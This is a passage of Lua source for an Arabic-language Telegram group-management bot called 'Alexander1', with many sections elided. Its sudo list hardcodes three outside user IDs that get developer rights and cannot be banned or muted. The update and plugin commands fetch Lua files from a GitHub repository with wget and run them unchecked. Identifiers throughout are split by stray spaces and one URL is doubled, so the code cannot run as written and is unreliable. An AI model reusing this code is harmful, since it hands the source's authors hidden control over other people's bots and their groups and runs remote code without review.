...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./Alexander1 .lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Alexander1  -X kill
screen -S Alexander1  ./Alexander1 
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/jack1eljoker1/Files_Alexander1 /master/File_Bot/commands.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/jack1eljoker1/Files_Alexander1 /master/File_Bot/Reply.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/jack1eljoker1/Files_Alexander1 /master/File_Bot/games.lua") 
...
sudo_users = {SUDO,1366055467,1508516804,1458654225}   
function SudoBot(msg)  
local Alexander1  = false  
...
if hash or SudoBot(msg) or DevAlexander1 W(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevAlexander1 W(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevAlexander1 W(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevAlexander1 W(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevAlexander1 W(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevAlexander1 W(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevAlexander1 W(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif tonumber(user_id) == tonumber(1508516804) then
var = true 
elseif tonumber(user_id) == tonumber(1458654225) then
var = true  
...
local UserName = (data.username_ or "vp_zo")
...
local Alexander1 _Msg = ''  
if msgs < 100 then 
Alexander1 _Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Alexander1 _Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Alexander1 _Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Alexander1 _Msg = 'متفاعل' 
elseif msgs < 1200 then 
Alexander1 _Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Alexander1 _Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Alexander1 _Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Alexander1 _Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Alexander1 _Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Alexander1 _Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Alexander1 _Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Alexander1 _Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Alexander1 _Msg = 'انت التفاعل'  
end 
return Alexander1 _Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"@SOURCE Alexander1")  
...
function plugin_Alexander1 (msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Alexander1  and msg then
pre_msg = plugin.Alexander1 (msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceAlexander1 (msg,data) -- بداية العمل
if msg then
...
if DevAlexander1 W(msg) then
local bl = '☤ اهلا عزيزي آلمـطـور\n☤ آنت آلمـطـور آلآسـآسـي للبوت\nــــــــــــــــــــــ☤ـــــــــــــــــــــ\n☤ تسـتطـيع‌‏ آلتحگم باوامر البوت\n☤ من خلاال الكيبورت خاص بك\n☤ قناة سورس البوت [اضغط هنا](t.me/vp_zo)'
local keyboard = {
{'المبرمج باندا ','اضف رد عام'},
{'قناه السورس'},
{'الاحصائيات'},
...
if start then 
SourceAlexander1 r = start
else
SourceAlexander1 r = '☤ اهلا عزيزي\n☤ انا بوت اسمي '..Namebot..'\n☤ اختصاصي حمايه المجموعات\n☤ من التكرار والسب…\n☤ لتفعيلي اتبع الاخطوات…↓\n☤ اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط\n[☤ [قناة سورس البوت](http://t.me/vp_zo)'
end 
send(msg.chat_id_, msg.id_, SourceAlexander1 r) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if not DevAlexander1 W(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevAlexander1 W(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,Alexander1 _Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل' and DevAlexander1 W(msg) then  
...
if text == 'تعطيل التواصل' and DevAlexander1 W(msg) then  
...
if text == 'تفعيل البوت خدمي' and DevAlexander1 W(msg) then  
...
if text == 'تعطيل البوت خدمي' and DevAlexander1 W(msg) then  
...
if text == 'ضع كليشه ستارت' and DevAlexander1 W(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'☤ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت' and DevAlexander1 W(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'☤ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر' and DevAlexander1 W(msg) then 
...
if text == 'تحديث السورس' and DevAlexander1 W(msg) then 
os.execute('rm -rf Alexander1 .lua')
os.execute('wget https://raw.githubusercontent.com/jack1eljoker1/Alexander1 22/master/Alexander1 .lua')
send(msg.chat_id_, msg.id_,'☤ تم تحديث السورس \n☤ لديك اخر اصدار لسورس بلاك\n☤ الاصدار » { V²}')
dofile('Alexander1 .lua')  
end
if text == 'الاصدار' and DevAlexander1 W(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'☤ اصدار سورس بلاك \n☤ الاصدار »{ V²}')
end
if text == "ضع اسم للبوت" and DevAlexander1 W(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"☤ ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات' and DevAlexander1 W(msg) then 
...
if text == 'المشتركين' and DevAlexander1 W(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n☤ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'المجموعات' and DevAlexander1 W(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n☤ المجموعات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين") and DevAlexander1 W(msg) then
...
if text == ("قائمه العام") and DevAlexander1 W(msg) then
...
if text == ("قائمه الكتم العام") and DevAlexander1 W(msg) then
...
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DevAlexander1 W(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☤ ارسل الان اذاعتك؟ \n☤ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and DevAlexander1 W(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☤ ارسل الان اذاعتك؟ \n☤ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DevAlexander1 W(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☤ ارسل الان اذاعتك؟ \n☤ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and DevAlexander1 W(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☤ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and DevAlexander1 W(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"☤ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه' and DevAlexander1 W(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين" and DevAlexander1 W(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف المجموعات" and DevAlexander1 W(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local Alexander1  = (w + q)
local sendok = #group - Alexander1 
if q == 0 then
Alexander1  = ''
else
...
send(msg.chat_id_, msg.id_,'☤  عدد المجموعات الان » { '..#group..' }'..Alexander1 k..''..Alexander1 ..'\n☤  الان عدد المجموعات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevAlexander1 W(msg) then
...
usertext = '\n☤ العضو » ['..result.title_..'](t.me/'..(username or 'vp_zo')..')'
status  = '\n☤ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevAlexander1 W(msg) then
...
usertext = '\n☤ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'vp_zo')..')'
status  = '\n☤ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevAlexander1 W(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevAlexander1 W(msg) then
...
local Alexander1 1_Msg = database:get(bot_id.."Alexander1 1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Alexander1 1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'☤ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'vp_zo')..') \n☤ '..Alexander1 1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if Alexander1 _Msg and not Special(msg) then  
local Alexander1 _Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Alexander1 _Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"☤ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n☤ ["..Alexander1 _Msg.."] \n")
else
send(msg.chat_id_,0,"☤ العضو : {["..data.first_name_.."](T.ME/vp_zo)}\n☤ ["..Alexander1 _Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "☤ عذرا » {["..data.first_name_.."](T.ME/vp_zo)}\n☤ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevAlexander1 W(msg) then
...
'\n☤ الرابط {['..LinkGp..']}'
if not DevAlexander1 W(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevAlexander1 W(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevAlexander1 W(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '☤ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevAlexander1 W(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '☤ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ☤ " and DevAlexander1 W(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "☤ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ☤ $") and DevAlexander1 W(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '☤ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ☤ " and DevAlexander1 W(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري ☤ " and DevAlexander1 W(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "☤ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ☤ " and DevAlexander1 W(msg) then  
...
database:sadd(bot_id.."Alexander1 :blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Alexander1 :blocname"..msg.chat_id_)
...
function SOURCE Alexander1_name(t1,t2)
if t2.id_ then 
name_Alexander1  = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_Alexander1  then 
names_Alexander1  = database:smembers(bot_id.."Alexander1 :blocname"..msg.chat_id_) or ""
if names_Alexander1  and names_Alexander1 [1] then 
for i=1,#names_Alexander1  do 
if name_Alexander1 :match("(.*)("..names_Alexander1 [i]..")(.*)") then 
...
bnnaGet(msg.sender_user_id_, SOURCE Alexander1_name)
end
...
database:set(bot_id.."Alexander1 :teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Alexander1 :nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Alexander1 :teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Alexander1 :nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Alexander1 :teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_Alexander1 a_new(Alexander1 1,Alexander1 2)
if Alexander1 2 and Alexander1 2.first_name_ then 
if Alexander1 2.first_name_:match("(.*)"..database:get(bot_id.."Alexander1 :teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Alexander1 :Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local Alexander1 _nnn = database:get(bot_id.."Alexander1 :nump"..msg.chat_id_) or 5
local Alexander1 _nnn2 = database:get(bot_id.."Alexander1 :nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(Alexander1 _nnn2) == tonumber(Alexander1 _nnn) or tonumber(Alexander1 _nnn2) > tonumber(Alexander1 _nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Alexander1 :nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "☤ عزيزي >>["..Alexander1 2.username_.."](https://t.me/"..(Alexander1 2.username_ or "vp_zo")..")\n☤ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Alexander1 :teh"..msg.chat_id_).."} بجانب اسمك\n☤ عدد المحاولات المتبقيه {"..(tonumber(Alexander1 _nnn) - tonumber(Alexander1 _nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_Alexander1 a_new)
end
end
...
local Alexander1 ChengName = database:get(bot_id.."Alexander1 :Cheng:Name"..data.id_)
if not data.first_name_ then 
if Alexander1 ChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..Alexander1 ChengName..']')
database:del(bot_id.."Alexander1 :Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if Alexander1 ChengName ~= data.first_name_ then 
local Text = {
...
database:set(bot_id.."Alexander1 :Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local Alexander1 ChengUserName = database:get(bot_id.."Alexander1 :Cheng:UserName"..data.id_)
if not data.username_ then 
if Alexander1 ChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..Alexander1 ChengUserName..']')
database:del(bot_id.."Alexander1 :Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if Alexander1 ChengUserName ~= data.username_ then 
local Text = {
'غيرت معرفك ليه 🙂😹',
...
database:set(bot_id.."Alexander1 :Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local Alexander1 ChengPhoto = database:get(bot_id.."Alexander1 :Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if Alexander1 ChengPhoto then 
send(msg.chat_id_, msg.id_, "القمر حذف صورو ليه ؟")
database:del(bot_id.."Alexander1 :Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if Alexander1 ChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "ليه غيرت صورتك ",
...
database:set(bot_id.."Alexander1 :Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
local Text = [[
W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚃𝙷𝙴 𝙰𝙻𝙴𝚇𝙰𝙽𝙳𝙴𝚁 𖢄
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مبرمج السورس ',url="t.me/uu_ban"}},
{{text = 'صاحب الابلكيشن',url="t.me/Elkomanda_y3m"}},
{{text = 'بويكا الهكر',url="t.me/b_o_y_k_a_a"}},
{{text = 'قناه السورس', url="t.me/vp_zo"}},
{{text = 'بوت توصل سورس', url="t.me/uu_ban25BOT"}},
}
...
if text == 'رفع نسخه الاحتياطيه' and DevAlexander1 W(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'☤ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'vp_zo')..') \n☤ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'☤ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'vp_zo')..') \n☤ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevAlexander1 W(msg) then    
dofile('Alexander1 .lua')  
send(msg.chat_id_, msg.id_, '☤ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevAlexander1 W(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevAlexander1 W(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if tonumber(result.sender_user_id_) == tonumber(1508516804) then  
send(msg.chat_id_, msg.id_, "☤ لا تستطيع كتم او حظر او تقييد مالك السورس ")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1366055467) then  
send(msg.chat_id_, msg.id_, "☤  لا تستطيع كتم او حظر او تقييد المبرمج باندا ")
return false 
end
if tonumber(userid) == tonumber(1458654225) then  
send(msg.chat_id_, msg.id_, "☤ لا تستطيع كتم او حظر او تقييد بويكا الهكر")
return false 
end
...
if text and text:match("^حظر عام @(.*)$")  and DevAlexander1 W(msg) then
...
if tonumber(result.id_) == tonumber(1366055467) then  
send(msg.chat_id_, msg.id_, "☤ لا تستطيع حظر او كتم او طرد المبرمج باندا")
return false 
end

if tonumber(result.id_) == tonumber(1508516804) then  
send(msg.chat_id_, msg.id_, "☤ لا تستطيع حظر او كتم او طرد مالك السورس")
return false 
end
if tonumber(userid) == tonumber(1458654225) then  
send(msg.chat_id_, msg.id_, "☤ لا تستطيع كتم او حظر او تقييد بويكا الهكر")
...
if text and text:match("^حظر عام (%d+)$") and DevAlexander1 W(msg) then
...
if tonumber(userid) == tonumber(1508516804) then  
send(msg.chat_id_, msg.id_, "☤ لا تستطيع كتم او حظر او تقييد مالك السورس")
return false 
end
if tonumber(userid) == tonumber(1458654225) then  
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevAlexander1 W(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevAlexander1 W(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevAlexander1 W(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevAlexander1 W(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevAlexander1 W(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevAlexander1 W(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevAlexander1 W(msg) then
...
if database:get(bot_id.."SOURCE Alexander1:admin:Time"..msg.chat_id_) then 
return
 send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'SOURCE Alexander1:admin:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."SOURCE Alexander1:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'SOURCE Alexander1:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if text == 'الملفات' and DevAlexander1 W(msg) then
t = '☤ ملفات السورس بلاك ↓\n SOURCE Alexander1² \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://https://raw.githubusercontent.com/jack1eljoker1/Files_Alexander1 /master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☤ اهلا بك في متجر ملفات بلاك\n ☤ ملفات السورس ↓\nــــــــــــــــــــــ☤ـــــــــــــــــــــ\n\n"
local TextE = "\nــــــــــــــــــــــ☤ـــــــــــــــــــــ\n ☤ علامة تعني { ✓ } ملف مفعل\n ☤ علامة تعني { ✘ } ملف معطل\n ☤ قناة سورس بلاك ↓\n".." ☤ [اضغط هنا لدخول](t.me/vp_zo) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/jack1eljoker1/Files_Alexander1 /master/File_Bot/"..file)
if res == 200 then
...
if text == ("رفع مطور") and msg.reply_to_message_id_ and DevAlexander1 W(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevAlexander1 W(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local UserName = (b.username_ or "vp_zo")
...
function Function_Alexander1 (extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Alexander1 , nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Alexander1 , nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n☤ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'vp_zo')..')'
status  = '\n☤ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n☤ العضو » '..userid..''
...
if text == 'جاك' then 
send(msg.chat_id_,msg.id_, '[مطور السورس.](http://t.me/SOURCE Alexander1) ') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n☤ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'vp_zo')..')'
...
database:set(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☤ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Alexander1 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Alexander1 1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"☤ تم منع الكلمه مع التحذير")  
database:del(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Alexander1 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Alexander1 1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Alexander1 1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"☤ ارسل الكلمه الان")  
database:set(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Alexander1 1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Alexander1 1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Alexander1 1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Alexander1 1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Alexander1 1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Alexander1 1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n☤ قائمة المنع \n SOURCE Alexander1²\n"
for k,v in pairs(list) do  
local Alexander1 _Msg = database:get(bot_id.."Alexander1 1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..Alexander1 _Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevAlexander1 W(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'☤ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevAlexander1 W(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n☤ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'vp_zo')..')'..'\n☤ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevAlexander1 W(msg) then  
...
if text == 'تعطيل الاذاعه' and DevAlexander1 W(msg) then  
...
if text == 'تفعيل البوت الخدمي' and DevAlexander1 W(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'تعطيل البوت الخدمي' and DevAlexander1 W(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if not database:get(bot_id..'SOURCE Alexander1:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'SOURCE Alexander1:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'باندا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'باندا')
local Alexander1 _Msg = {
'اؤمرني 🥺💕.',
'ليا اسم خد بالك ☹️.',
...
send(msg.chat_id_, msg.id_,'['..Alexander1 _Msg[math.random(#Alexander1 _Msg)]..']') 
return false
end
